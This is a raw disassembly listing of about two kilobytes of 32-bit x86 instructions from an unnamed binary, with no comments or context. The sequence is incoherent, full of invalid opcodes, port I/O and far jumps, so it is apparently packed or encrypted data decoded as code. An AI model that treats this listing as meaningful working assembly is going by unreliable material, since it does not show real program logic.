  41a8af:	shl    bh,0xe3
  41a8b2:	bound  ecx,QWORD PTR [edi+eax*4+0x12a20410]
  41a8b9:	mov    ebx,0x654942cd
  41a8be:	nop
  41a8bf:	push   ebp
  41a8c0:	mov    ebx,edi
  41a8c2:	jmp    0x3ac902a9
  41a8c7:	int    0x65
  41a8c9:	and    BYTE PTR [edx+0xc],bh
  41a8cc:	sub    ch,BYTE PTR [eax+eiz*1]
  41a8cf:	inc    esi
  41a8d0:	sar    esi,0x14
  41a8d3:	out    dx,eax
  41a8d4:	push   ss
  41a8d5:	shl    DWORD PTR [edi-0x7c726a00],cl
  41a8db:	push   edx
  41a8dc:	add    ecx,DWORD PTR ds:0x549dc8c0
  41a8e2:	push   edi
  41a8e3:	je     0x41a8b0
  41a8e5:	inc    edx
  41a8e6:	sub    dl,BYTE PTR [esi+ecx*8+0x36]
  41a8ea:	popf   
  41a8eb:	call   0xd076:0x52aa205
  41a8f2:	dec    esp
  41a8f3:	in     eax,0xa3
  41a8f5:	adc    ch,BYTE PTR [edi+0x63d56ba6]
  41a8fb:	xor    ecx,esi
  41a8fd:	ds in  eax,0x12
  41a900:	push   edi
  41a901:	jge    0x41a92e
  41a903:	push   ss
  41a904:	sbb    bl,BYTE PTR [edx]
  41a906:	or     bl,bh
  41a908:	sbb    al,0xc0
  41a90a:	lock cld 
  41a90c:	sbb    BYTE PTR [ebx],dl
  41a90e:	xor    BYTE PTR [edi-0x7c],ch
  41a911:	or     al,0x9b
  41a913:	cmp    al,BYTE PTR [ebx-0x32]
  41a916:	sbb    eax,0xea07563b
  41a91b:	xor    edi,DWORD PTR [edx-0x6211786a]
  41a921:	sbb    al,al
  41a923:	xor    dl,BYTE PTR [edx+edi*4-0x57]
  41a927:	out    dx,eax
  41a928:	rcl    cl,cl
  41a92a:	jle    0x41a93d
  41a92c:	sbb    eax,0xd46136a6
  41a931:	push   0xffffffed
  41a933:	dec    esi
  41a934:	or     ebx,esp
  41a936:	push   edi
  41a937:	int3   
  41a938:	jg     0x41a905
  41a93a:	push   ebp
  41a93b:	pushf  
  41a93c:	push   cs
  41a93d:	jl     0x41a996
  41a93f:	jle    0x41a910
  41a941:	inc    ebp
  41a942:	fucomi st,st(4)
  41a944:	push   es
  41a945:	lods   eax,DWORD PTR ds:[esi]
  41a946:	fsubrp st(1),st
  41a948:	imul   esi,DWORD PTR ds:0xb0a60bfc,0xa153035c
  41a952:	aad    0x49
  41a954:	sbb    ah,BYTE PTR [ebx-0x5041b018]
  41a95a:	fst    QWORD PTR [eax+0x325266de]
  41a960:	nop
  41a961:	fnstsw WORD PTR [esi-0x66b0f201]
  41a967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a968:	dec    eax
  41a969:	and    al,0x69
  41a96b:	mov    eax,0x4129aab
  41a970:	(bad)  
  41a971:	ja     0x41a982
  41a973:	jne    0x41a900
  41a975:	jge    0x41a903
  41a977:	scas   al,BYTE PTR es:[edi]
  41a978:	push   ebx
  41a979:	fiadd  WORD PTR [ecx]
  41a97b:	call   0x6330:0xe4cedab1
  41a982:	and    eax,0x6941bda9
  41a987:	mov    ebx,0x7a1b73e4
  41a98c:	outs   dx,DWORD PTR ds:[esi]
  41a98d:	inc    eax
  41a98e:	loop   0x41a91d
  41a990:	data16 (bad) 
  41a992:	ror    bh,1
  41a994:	mov    WORD PTR [ecx+eiz*1],gs
  41a997:	push   eax
  41a998:	xchg   DWORD PTR [edx],edi
  41a99a:	xor    dl,BYTE PTR [edx-0x1c]
  41a99d:	gs out 0xfe,al
  41a9a0:	mov    ah,0xb2
  41a9a2:	scas   al,BYTE PTR es:[edi]
  41a9a3:	jle    0x41aa0a
  41a9a5:	sbb    ebx,edx
  41a9a7:	leave  
  41a9a8:	cmp    BYTE PTR [eax+0x4d154a86],ah
  41a9ae:	mov    WORD PTR [esi-0xa],ds
  41a9b1:	out    dx,al
  41a9b2:	(bad)  
  41a9b3:	in     eax,0x54
  41a9b5:	adc    DWORD PTR [ebp+0x51],ebx
  41a9b8:	jecxz  0x41a958
  41a9ba:	add    edi,eax
  41a9bc:	hlt    
  41a9bd:	xchg   ebx,eax
  41a9be:	xchg   bh,bh
  41a9c0:	xor    BYTE PTR [eax-0x24],cl
  41a9c3:	cdq    
  41a9c4:	mov    BYTE PTR [ebx+0x2d],dl
  41a9c7:	imul   ebp,DWORD PTR [ebp+0x54],0x13226d22
  41a9ce:	(bad)  
  41a9cf:	jbe    0x41a9af
  41a9d1:	and    DWORD PTR es:[edx],ecx
  41a9d4:	sbb    ah,al
  41a9d6:	nop
  41a9d7:	retf   0x8e4c
  41a9da:	sbb    al,0xeb
  41a9dc:	jge    0x41aa51
  41a9de:	xchg   esp,eax
  41a9df:	js     0x41a9e5
  41a9e1:	add    DWORD PTR [eax],ecx
  41a9e3:	cli    
  41a9e4:	fstp   QWORD PTR [eax]
  41a9e6:	mov    ds:0xe47efe58,al
  41a9eb:	nop
  41a9ec:	pop    ebx
  41a9ed:	int3   
  41a9ee:	repz pop edx
  41a9f0:	cmp    BYTE PTR [ebx+0x504d354],dh
  41a9f6:	mov    al,ds:0x457f7897
  41a9fb:	xchg   edx,eax
  41a9fc:	jno    0x41a9e4
  41a9fe:	scas   eax,DWORD PTR es:[edi]
  41a9ff:	adc    eax,0x15f4502b
  41aa04:	jbe    0x41aa6c
  41aa06:	fwait
  41aa07:	aas    
  41aa08:	mov    al,ds:0x35667e18
  41aa0d:	xlat   BYTE PTR ds:[ebx]
  41aa0e:	inc    esi
  41aa0f:	sti    
  41aa10:	loop   0x41aa84
  41aa12:	js     0x41a997
  41aa14:	aad    0x5c
  41aa16:	cdq    
  41aa17:	xor    bl,BYTE PTR [eax+0x2cda00c5]
  41aa1d:	or     edi,DWORD PTR [esp+ecx*8-0x77a76d8d]
  41aa24:	push   ecx
  41aa25:	mul    BYTE PTR [esp+ebp*2-0x5b4c0e17]
  41aa2c:	ss xchg edi,eax
  41aa2e:	aad    0x23
  41aa30:	inc    edx
  41aa31:	pushf  
  41aa32:	mov    esp,0x8080f09b
  41aa37:	or     dh,BYTE PTR [edi]
  41aa39:	pop    ebp
  41aa3a:	or     edx,ebx
  41aa3c:	add    eax,0x228dfb70
  41aa41:	xchg   edi,eax
  41aa42:	sbb    bl,BYTE PTR [ecx+eiz*8]
  41aa45:	mov    ds:0xe4ee38ab,al
  41aa4a:	ins    BYTE PTR es:[edi],dx
  41aa4b:	or     edi,DWORD PTR [edi+0x1d]
  41aa4e:	shr    DWORD PTR [ebx+0x48],1
  41aa51:	mov    al,ds:0x345a7a7f
  41aa56:	out    dx,eax
  41aa57:	xlat   BYTE PTR ds:[ebx]
  41aa58:	fist   DWORD PTR [edi+ebp*2]
  41aa5b:	sub    eax,0xf637ee77
  41aa60:	fist   WORD PTR [edi]
  41aa62:	or     al,0x2f
  41aa64:	push   esi
  41aa65:	loope  0x41aa93
  41aa67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa68:	xor    DWORD PTR [ecx+esi*2-0x20],eax
  41aa6c:	add    edi,esp
  41aa6e:	in     al,0x86
  41aa70:	and    BYTE PTR [ebx+ecx*2],ch
  41aa73:	cmc    
  41aa74:	xlat   BYTE PTR ds:[ebx]
  41aa75:	enter  0xd2fa,0x7c
  41aa79:	push   ds
  41aa7a:	push   ss
  41aa7b:	repnz or sp,di
  41aa7f:	cmp    DWORD PTR [esi-0x6a539d3e],edx
  41aa85:	(bad)  
  41aa86:	scas   eax,DWORD PTR es:[edi]
  41aa87:	dec    ebp
  41aa88:	push   ecx
  41aa89:	call   0x980318a1
  41aa8e:	add    al,0x1e
  41aa90:	repnz add eax,0x8f1ffc6a
  41aa96:	and    esp,DWORD PTR [ebp-0x42]
  41aa99:	jbe    0x41aaff
  41aa9b:	push   ss
  41aa9c:	pushf  
  41aa9d:	adc    eax,0x6140082
  41aaa2:	push   ecx
  41aaa3:	data16 and BYTE PTR [edi+0x4b],0xd4
  41aaa8:	mov    ch,0xc8
  41aaaa:	pushf  
  41aaab:	repnz cmp ch,BYTE PTR [ebx-0x53283931]
  41aab2:	(bad)  
  41aab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aab4:	arpl   WORD PTR [esi],dx
  41aab6:	addr16 mov ecx,0x48c85ab7
  41aabc:	int    0x42
  41aabe:	pop    ebp
  41aabf:	jle    0x41aab9
  41aac1:	leave  
  41aac2:	fsubr  QWORD PTR [esi-0x7788690d]
  41aac8:	or     esp,esi
  41aaca:	push   esp
  41aacb:	mov    bh,0xb5
  41aacd:	push   esp
  41aace:	pop    esp
  41aacf:	xor    edi,DWORD PTR [eax+0x3f]
  41aad2:	mov    ebp,0xea73c77
  41aad7:	pop    esp
  41aad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad9:	jecxz  0x41ab08
  41aadb:	fwait
  41aadc:	mov    ecx,DWORD PTR [esi+ebx*8+0x722ff9d3]
  41aae3:	bound  ecx,QWORD PTR [ebp-0x1b]
  41aae6:	cld    
  41aae7:	ss es test al,0x6f
  41aaeb:	mov    bh,0x94
  41aaed:	sub    DWORD PTR [ebp-0x43],ecx
  41aaf0:	(bad)  
  41aaf1:	mov    edi,0xf07f6f0c
  41aaf6:	int3   
  41aaf7:	lods   al,BYTE PTR ds:[esi]
  41aaf8:	sub    eax,0xc1f55ea9
  41aafd:	xor    esp,esi
  41aaff:	mov    eax,esi
  41ab01:	out    0x22,al
  41ab03:	jnp    0x41ab37
  41ab05:	call   0xd617:0xad723ae4
  41ab0c:	por    mm4,QWORD PTR [esi]
  41ab0f:	mov    edi,0x18b07cde
  41ab14:	mov    edi,0x496d523
  41ab19:	pop    esp
  41ab1a:	test   BYTE PTR [ebp-0x75],ah
  41ab1d:	push   0x27cf9461
  41ab22:	cs leave 
  41ab24:	test   DWORD PTR [ebx],ecx
  41ab26:	cmc    
  41ab27:	xchg   esp,eax
  41ab28:	xor    ah,BYTE PTR [di-0x79]
  41ab2c:	repnz test al,0xab
  41ab2f:	dec    esp
  41ab30:	mov    ebx,0xd7974344
  41ab35:	mov    BYTE PTR [edi],bl
  41ab37:	push   ecx
  41ab38:	push   esp
  41ab39:	xchg   ecx,eax
  41ab3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab3b:	sbb    bh,al
  41ab3d:	xor    bh,ah
  41ab3f:	(bad)  
  41ab40:	mov    bl,dl
  41ab42:	pop    ss
  41ab43:	gs adc esp,0xcc7413d6
  41ab4a:	clc    
  41ab4b:	dec    edx
  41ab4c:	cmp    DWORD PTR [ecx],edi
  41ab4e:	mul    DWORD PTR [eax+ecx*4-0x35ce5817]
  41ab55:	pop    edi
  41ab56:	into   
  41ab57:	cmp    BYTE PTR [ecx],dh
  41ab59:	clc    
  41ab5a:	and    ebx,DWORD PTR [ebp-0x39]
  41ab5d:	xor    ah,BYTE PTR [edi]
  41ab5f:	xchg   edi,eax
  41ab60:	inc    esp
  41ab61:	scas   eax,DWORD PTR es:[edi]
  41ab62:	lods   eax,DWORD PTR ds:[esi]
  41ab63:	fs dec edi
  41ab65:	mov    ds:0xe294d38e,eax
  41ab6a:	dec    esi
  41ab6b:	cmp    ah,BYTE PTR [esp+eax*2+0x4abfd914]
  41ab72:	mov    WORD PTR [ecx+eax*4+0x37],es
  41ab76:	mov    ds:0x8d67e083,eax
  41ab7b:	sbb    BYTE PTR [eax],al
  41ab7d:	icebp  
  41ab7e:	icebp  
  41ab7f:	push   esp
  41ab80:	hlt    
  41ab81:	and    edx,DWORD PTR [ebp+0x752aa85]
  41ab87:	les    ebx,FWORD PTR [edx+edx*2]
  41ab8a:	cmc    
  41ab8b:	xchg   edx,eax
  41ab8c:	stc    
  41ab8d:	jb     0x41abf6
  41ab8f:	adc    al,dl
  41ab91:	mov    edi,DWORD PTR [edx-0x121804b0]
  41ab97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab98:	sbb    dl,BYTE PTR [ebx]
  41ab9a:	in     eax,0xf
  41ab9c:	xchg   edi,eax
  41ab9d:	mov    edi,0x89bdc01a
  41aba2:	fsubr  QWORD PTR [edx+0x45000f91]
  41aba8:	or     ch,BYTE PTR [ebx+0x10]
  41abab:	loop   0x41abf1
  41abad:	cs xor bl,ch
  41abb0:	xor    DWORD PTR [ebx+0x43],edi
  41abb3:	aad    0x1d
  41abb5:	jae    0x41ac29
  41abb7:	fs sub al,0xb8
  41abba:	dec    esp
  41abbb:	add    DWORD PTR [edi-0x7869bdc1],edx
  41abc1:	dec    esi
  41abc2:	mov    eax,0x3a03ecb1
  41abc7:	pop    ecx
  41abc8:	push   es
  41abc9:	sub    BYTE PTR [ebx],dl
  41abcb:	pop    esi
  41abcc:	pop    ss
  41abcd:	and    BYTE PTR [ecx],0xdf
  41abd0:	jg     0x41abc2
  41abd2:	lock mov ch,0xe9
  41abd5:	jmp    0xfa2a:0xe703b245
  41abdc:	rcl    BYTE PTR [edi],cl
  41abde:	push   ecx
  41abdf:	enter  0xe6aa,0x93
  41abe3:	les    eax,FWORD PTR [edi+0x5d]
  41abe6:	das    
  41abe7:	mov    bl,0x74
  41abe9:	ins    DWORD PTR es:[edi],dx
  41abea:	popf   
  41abeb:	push   eax
  41abec:	mov    eax,ds:0x6bb55ac9
  41abf1:	jo     0x41ac19
  41abf3:	retf   
  41abf4:	push   ebx
  41abf5:	stos   BYTE PTR es:[edi],al
  41abf6:	aas    
  41abf7:	xchg   edi,eax
  41abf8:	outs   dx,BYTE PTR ds:[esi]
  41abf9:	scas   al,BYTE PTR es:[edi]
  41abfa:	mov    al,ds:0x90950f63
  41ac00:	mov    eax,0xed44e6e
  41ac05:	xor    al,0xf4
  41ac07:	shr    DWORD PTR [ebx+0x7822857f],1
  41ac0d:	xchg   edi,eax
  41ac0e:	mov    ds:0x5eed3c8d,eax
  41ac13:	clc    
  41ac14:	cld    
  41ac15:	push   es
  41ac16:	(bad)
  41ac19:	xchg   ebp,eax
  41ac1a:	nop
  41ac1b:	mov    BYTE PTR [esi+0x2c2be230],al
  41ac21:	loop   0x41abb3
  41ac23:	cli    
  41ac24:	ds sti 
  41ac26:	inc    ecx
  41ac27:	fiadd  DWORD PTR [ebp-0x3111fe52]
  41ac2d:	aad    0xdd
  41ac2f:	test   eax,0xc805dd70
  41ac34:	cmp    BYTE PTR ds:0x1a8b0c16,0x65
  41ac3b:	mov    BYTE PTR [edi],cl
  41ac3d:	cwde   
  41ac3e:	cmp    cl,ah
  41ac40:	les    esp,FWORD PTR [edi+0x39d2885a]
  41ac46:	js     0x41abdd
  41ac48:	cs cmp esp,esi
  41ac4b:	sub    DWORD PTR [ebx],ebp
  41ac4d:	jg     0x41abfb
  41ac4f:	mov    ebx,?
  41ac51:	dec    edi
  41ac52:	xor    DWORD PTR [esi+edi*4-0x6d3bf088],ecx
  41ac59:	xchg   DWORD PTR [esi-0xb],ecx
  41ac5c:	sar    BYTE PTR [esi],0x5e
  41ac5f:	push   ss
  41ac60:	es pop es
  41ac62:	retf   
  41ac63:	jns    0x41acc1
  41ac65:	mov    ecx,0xddd8790f
  41ac6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac6b:	pusha  
  41ac6c:	sbb    DWORD PTR ds:0x55bcb427,esp
  41ac72:	fdivr  DWORD PTR [ecx]
  41ac74:	punpckhwd mm7,QWORD PTR [edi+edi*4-0x6c]
  41ac79:	popf   
  41ac7a:	(bad)  
  41ac7c:	xchg   ebx,eax
  41ac7d:	xor    DWORD PTR [ebx],ecx
  41ac7f:	lds    ebp,FWORD PTR [ebx+ebx*1+0x3a]
  41ac83:	and    esp,esi
  41ac85:	stc    
  41ac86:	cmc    
  41ac87:	xchg   ebp,eax
  41ac88:	aas    
  41ac89:	js     0x41ac0f
  41ac8b:	pushaw 
  41ac8d:	aad    0x97
  41ac8f:	mov    BYTE PTR [edx+esi*1],bh
  41ac92:	in     eax,dx
  41ac93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac94:	sar    cl,1
  41ac96:	mov    edx,0xc4970e1b
  41ac9b:	in     eax,0x1c
  41ac9d:	(bad)  
  41ac9e:	jl     0x41ad05
  41aca0:	sbb    DWORD PTR [ebx-0x57],esi
  41aca3:	mov    ss:0x46d439d3,al
  41aca9:	sbb    al,0x93
  41acab:	dec    ebx
  41acac:	shr    ch,cl
  41acae:	lahf   
  41acaf:	dec    edx
  41acb0:	mov    ebx,0x6299b736
  41acb5:	sub    bl,BYTE PTR [esi+0x24]
  41acb8:	(bad)  
  41acb9:	out    0xbc,eax
  41acbb:	jle    0x41ac81
  41acbd:	pop    esi
  41acbe:	int3   
  41acbf:	inc    esp
  41acc0:	push   ds
  41acc1:	rol    ch,cl
  41acc3:	mov    al,ds:0x3537d1d8
  41acc8:	dec    esi
  41acc9:	mov    dl,0x1f
  41accb:	out    dx,eax
  41accc:	out    0x57,al
  41acce:	repz test BYTE PTR [ecx+ebx*4-0xf18fcfa],0x41
  41acd7:	in     al,0x14
  41acd9:	pushf  
  41acda:	xchg   BYTE PTR [edi],bl
  41acdc:	and    cl,ah
  41acde:	mov    edx,0x7ba1c729
  41ace3:	dec    ecx
  41ace4:	dec    esi
  41ace5:	mov    esp,DWORD PTR [edx+edi*8+0x5b06dcb5]
  41acec:	jno    0x41ace6
  41acee:	imul   eax,edx,0x7
  41acf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf2:	mov    eax,0x7f34fc56
  41acf7:	mov    ?,WORD PTR [ecx]
  41acf9:	stos   DWORD PTR es:[edi],eax
  41acfa:	leave  
  41acfb:	arpl   WORD PTR [esi+esi*2+0x3d],cx
  41acff:	nop
  41ad00:	in     eax,dx
  41ad01:	(bad)
  41ad04:	lock test bh,bh
  41ad07:	adc    al,0x91
  41ad09:	shl    BYTE PTR [esi],0xd9
  41ad0c:	sbb    esp,DWORD PTR [esi+0x7f8b933a]
  41ad12:	push   edx
  41ad13:	mov    ss,WORD PTR [ebp-0x62]
  41ad16:	pop    DWORD PTR [ebx+0x43]
  41ad19:	fbld   TBYTE PTR [esi+0x52]
  41ad1c:	pop    edi
  41ad1d:	inc    eax
  41ad1e:	xchg   ecx,eax
  41ad1f:	das    
  41ad20:	retf   0x5583
  41ad23:	cdq    
  41ad24:	in     eax,dx
  41ad25:	push   0xffffffeb
  41ad27:	pushf  
  41ad28:	mov    ch,0x14
  41ad2a:	retf   0x28c6
  41ad2d:	or     BYTE PTR ds:[edx+eiz*4+0x5e0a28fc],0x77
  41ad36:	dec    ebp
  41ad37:	sar    BYTE PTR ds:0xc242cbc4,0xec
  41ad3e:	sbb    BYTE PTR [ebx],ah
  41ad40:	xor    al,0x4b
  41ad42:	dec    esp
  41ad43:	push   0xffffffa5
  41ad45:	data16 jle 0x41acf7
  41ad48:	and    DWORD PTR [esi+0x1724ecfd],eax
  41ad4e:	in     eax,0x84
  41ad50:	in     eax,0x16
  41ad52:	sahf   
  41ad53:	sti    
  41ad54:	or     BYTE PTR [esi-0x60],0x50
  41ad58:	retf   
  41ad59:	cdq    
  41ad5a:	jo     0x41ad1a
  41ad5c:	loop   0x41ad7b
  41ad5e:	lods   al,BYTE PTR ds:[esi]
  41ad5f:	jb     0x41ad53
  41ad61:	mov    ch,0x95
  41ad63:	popa   
  41ad64:	out    dx,eax
  41ad65:	jmp    0x8a45f657
  41ad6a:	adc    DWORD PTR [esi],0xffffff86
  41ad6d:	mov    al,ds:0xdb2178d8
  41ad72:	xor    al,BYTE PTR [edi-0x49]
  41ad75:	sti    
  41ad76:	cmp    al,0x2c
  41ad78:	pop    esp
  41ad79:	call   0x238a:0x4a950f0
  41ad80:	aam    0xb2
  41ad82:	stos   BYTE PTR es:[edi],al
  41ad83:	aad    0x0
  41ad85:	add    bl,BYTE PTR [edi]
  41ad87:	lock (bad) 
  41ad89:	int3   
  41ad8a:	cmp    BYTE PTR [edx+0x46e25c43],dh
  41ad90:	push   esp
  41ad91:	adc    al,0x9c
  41ad93:	(bad)  
  41ad94:	jbe    0x41adf8
  41ad96:	aad    0xab
  41ad98:	dec    ebp
  41ad99:	daa    
  41ad9a:	pop    ebp
  41ad9b:	jno    0x41adf8
  41ad9d:	pop    ecx
  41ad9e:	add    eax,0x16906cb4
  41ada3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ada4:	fisttp DWORD PTR [edx+0x6c9972f6]
  41adaa:	iret   
  41adab:	in     eax,0xf3
  41adad:	jbe    0x41ad87
  41adaf:	mov    edi,0x30933a17
  41adb4:	mov    ds:0x23df5ded,al
  41adb9:	push   edi
  41adba:	sub    BYTE PTR [edi],bh
  41adbc:	xor    edi,DWORD PTR [edi+edi*1+0x11]
  41adc0:	fdivr  QWORD PTR [esi]
  41adc2:	aas    
  41adc3:	(bad)  
  41adc4:	mov    ecx,0x352ad1f5
  41adc9:	pop    edx
  41adca:	adc    DWORD PTR [eax+0x4dd9de82],esi
  41add0:	fwait
  41add1:	mov    dh,BYTE PTR [ebx-0x72]
  41add4:	xor    ch,BYTE PTR [edx-0x44]
  41add7:	jle    0x41ad7e
  41add9:	call   0xec4:0x3767ca29
  41ade0:	xor    eax,DWORD PTR [edx-0x82af43]
  41ade6:	xchg   esi,eax
  41ade7:	mov    dl,BYTE PTR [eax]
  41ade9:	lea    eax,[eax-0x47]
  41adec:	repnz rcr ch,cl
  41adef:	fs stc 
  41adf1:	into   
  41adf2:	stos   DWORD PTR es:[edi],eax
  41adf3:	stos   BYTE PTR es:[edi],al
  41adf4:	mov    WORD PTR [edx+0x447d1654],fs
  41adfa:	pusha  
  41adfb:	repz (bad) 
  41adfd:	mulps  xmm1,XMMWORD PTR [edi+0x68]
  41ae01:	sbb    eax,0xbcc5c426
  41ae06:	rcl    BYTE PTR [ecx+0x6cb5c504],1
  41ae0c:	jnp    0x41ade3
  41ae0e:	xchg   esi,eax
  41ae0f:	stos   DWORD PTR es:[edi],eax
  41ae10:	pushf  
  41ae11:	inc    ebp
  41ae12:	push   ecx
  41ae13:	sbb    DWORD PTR [ebx-0x4b],ebx
  41ae16:	jae    0x41ae26
  41ae18:	ins    DWORD PTR es:[edi],dx
  41ae19:	adc    ecx,DWORD PTR [eax]
  41ae1b:	shl    DWORD PTR [ebp-0x69cbf61b],1
  41ae21:	add    al,0x1b
  41ae23:	xchg   al,al
  41ae25:	cli    
  41ae26:	jae    0x41ae0d
  41ae28:	cmp    eax,0xa0ebf277
  41ae2d:	(bad)  
  41ae2e:	rcl    DWORD PTR [edx-0xc],0x12
  41ae32:	mov    dl,0xe9
  41ae34:	stc    
  41ae35:	shl    BYTE PTR [ebx],0xe1
  41ae38:	ins    BYTE PTR es:[edi],dx
  41ae39:	adc    ch,al
  41ae3b:	jno    0x41ae5f
  41ae3d:	aaa    
  41ae3e:	mov    ah,0xe0
  41ae40:	or     DWORD PTR [ebx+0x6f],ebx
  41ae43:	xor    DWORD PTR [ecx*1+0x7dabac0f],esp
  41ae4a:	adc    eax,0x72f40e05
  41ae4f:	aas    
  41ae50:	xlat   BYTE PTR ds:[ebx]
  41ae51:	mov    al,ds:0x6feea8b7
  41ae56:	fsub   QWORD PTR [edx-0x7763e4d3]
  41ae5c:	xor    eax,0x3
  41ae5f:	retf   0x6725
  41ae62:	dec    ebp
  41ae63:	in     al,0x1c
  41ae65:	inc    eax
  41ae66:	pushf  
  41ae67:	data16 ja 0x41ae9b
  41ae6a:	xor    ch,BYTE PTR [ecx+0x2f26be29]
  41ae70:	data16 (bad) 
  41ae72:	xor    cl,BYTE PTR [esi]
  41ae74:	push   0xe9834aad
  41ae79:	sbb    al,0x36
  41ae7b:	sub    DWORD PTR [edi+0x4d],esi
  41ae7e:	mov    ds:0xa3575d21,eax
  41ae83:	rcr    DWORD PTR [ebx-0x2958f8ed],1
  41ae89:	pushw  ds
  41ae8b:	mov    dl,0x48
  41ae8d:	or     ah,ch
  41ae8f:	ret    0xbbd6
  41ae92:	push   es
  41ae93:	int3   
  41ae94:	out    dx,eax
  41ae95:	xchg   BYTE PTR [ebx],cl
  41ae97:	sbb    BYTE PTR [ecx+0x6e3bfec9],dl
  41ae9d:	add    al,0xb9
  41ae9f:	sahf   
  41aea0:	shl    ah,0xc8
  41aea3:	inc    eax
  41aea4:	adc    eax,0xb8f9e2f7
  41aea9:	imul   edi,DWORD PTR [ebp+0x5e],0xffffffbc
  41aead:	sbb    BYTE PTR ds:0x4ee0cc98,al
  41aeb3:	icebp  
  41aeb4:	push   ebx
  41aeb5:	push   eax
  41aeb6:	push   edi
  41aeb7:	sub    ebp,edi
  41aeb9:	ins    BYTE PTR es:[edi],dx
  41aeba:	int    0x93
  41aebc:	jae    0x41af10
  41aebe:	cmp    ch,BYTE PTR [ecx-0x710ae8a]
  41aec4:	adc    bh,BYTE PTR [edi-0x5a1288d8]
  41aeca:	adc    eax,0xfe96661c
  41aecf:	mov    dl,0x37
  41aed1:	fild   QWORD PTR [eax]
  41aed3:	outs   dx,DWORD PTR ds:[esi]
  41aed4:	and    eax,0xecf5ba2c
  41aed9:	sbb    bl,BYTE PTR [edx+0x7331c847]
  41aedf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aee0:	je     0x41ae82
  41aee2:	imul   ebx,DWORD PTR [ebp+0x65],0x22fdb9e6
  41aee9:	lods   eax,DWORD PTR ds:[esi]
  41aeea:	or     al,0xcf
  41aeec:	dec    esp
  41aeed:	js     0x41aeed
  41aeef:	add    al,dh
  41aef1:	daa    
  41aef2:	(bad)
  41aef5:	ffreep st(1)
  41aef7:	adc    ah,BYTE PTR [eax-0x10cf32ab]
  41aefd:	mov    ebx,0xc7246b18
  41af02:	jg     0x41af3d
  41af04:	xor    ah,0x74
  41af07:	xor    dl,BYTE PTR [eax+0x61129b89]
  41af0d:	les    esi,FWORD PTR [ebp-0x32]
  41af10:	scas   eax,DWORD PTR es:[edi]
  41af11:	out    dx,eax
  41af12:	dec    edi
  41af14:	not    BYTE PTR [esi-0x16]
  41af17:	leave  
  41af18:	jo     0x41af30
  41af1a:	cmp    ebp,DWORD PTR [esi+0x4d0f4cf]
  41af20:	cmp    al,0x88
  41af22:	(bad)  
  41af23:	icebp  
  41af24:	jmp    0x41aef5
  41af26:	loope  0x41af87
  41af28:	xchg   ebx,eax
  41af29:	xor    ebp,DWORD PTR [eax-0x77f4a1bc]
  41af2f:	xor    al,0xa1
  41af31:	and    al,0x7e
  41af33:	add    eax,0xd5c115
  41af38:	rcr    al,cl
  41af3a:	jb     0x41af90
  41af3c:	and    cl,BYTE PTR [ecx]
  41af3e:	fnsave [edi+0x6e]
  41af41:	int3   
  41af42:	ret    
  41af43:	test   BYTE PTR [edi],al
  41af45:	jl     0x41af2d
  41af47:	inc    ecx
  41af48:	xchg   esi,eax
  41af49:	mov    dh,0x41
  41af4b:	fild   QWORD PTR [ebp+0x15]
  41af4e:	test   DWORD PTR [bx],esp
  41af51:	sar    BYTE PTR [edx+edx*4+0x527acf0b],cl
  41af58:	jne    0x41af80
  41af5a:	retf   0x33e4
  41af5d:	or     bh,ch
  41af5f:	cmp    bl,ah
  41af61:	and    al,0xef
  41af63:	das    
  41af64:	or     BYTE PTR [edi],ch
  41af66:	sub    al,bl
  41af68:	imul   ebp,DWORD PTR [ecx],0xfd139229
  41af6e:	add    DWORD PTR [edi+esi*8-0x3f8d9fee],esi
  41af75:	pop    es
  41af76:	xlat   BYTE PTR ds:[ebx]
  41af77:	pop    edi
  41af78:	call   0x993a:0x9c4ba29
  41af7f:	pop    esi
  41af80:	mov    ebx,0x6b739268
  41af85:	xchg   esp,eax
  41af86:	rol    BYTE PTR ds:0x2fa64093,cl
  41af8c:	cmp    dl,0xad
  41af8f:	es (bad) 
  41af92:	xor    eax,0x256e2ec6
  41af97:	sti    
  41af98:	arpl   bp,ax
  41af9a:	push   0xffffffc2
  41af9c:	and    al,0xb7
  41af9e:	fstp   QWORD PTR [ecx-0x5cb7e088]
  41afa4:	jns    0x41aff9
  41afa6:	dec    ecx
  41afa7:	and    BYTE PTR [edi],ah
  41afa9:	push   esp
  41afaa:	jo     0x41afc5
  41afac:	jbe    0x41af4b
  41afae:	sub    ecx,edx
  41afb0:	pusha  
  41afb1:	mov    eax,ds:0x27745684
  41afb6:	cwde   
  41afb7:	cli    
  41afb8:	ds aad 0xc1
  41afbb:	repz cs out 0x7a,al
  41afbf:	(bad)  
  41afc0:	out    0xfd,al
  41afc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41afc3:	ficomp WORD PTR [ecx+edi*8]
  41afc6:	shl    ah,cl
  41afc8:	push   eax
  41afc9:	aaa    
  41afca:	loop   0x41afab
  41afcc:	sub    al,0xd3
  41afce:	nop
  41afcf:	mov    fs,WORD PTR [edi]
  41afd1:	into   
  41afd2:	cmp    esp,eax
  41afd4:	mov    edx,0x927e7cec
  41afd9:	mov    bh,0xb
  41afdb:	(bad)  [ebx+0x533175c3]
  41afe1:	jp     0x41afb9
  41afe3:	mov    ebx,0x14c6f11
  41afe8:	loop   0x41af79
  41afea:	test   al,0xd4
  41afec:	dec    ebx
  41afed:	sub    al,0x16
  41afef:	(bad)  
  41aff0:	test   al,0xae
  41aff2:	enter  0x4678,0xc8
  41aff6:	pop    ecx
  41aff7:	adc    al,0x41
  41aff9:	push   ecx
  41affa:	ret    0x8012
  41affd:	dec    dh
  41afff:	sti    
  41b000:	and    bh,BYTE PTR [ebx]
  41b002:	inc    esi
  41b003:	test   DWORD PTR [ecx+ebx*8],edx
  41b006:	mov    dl,bh
  41b008:	jbe    0x41b038
  41b00a:	and    al,0xc1
  41b00c:	fwait
  41b00d:	ret    0x9b8b
  41b010:	and    eax,0xb963e0d8
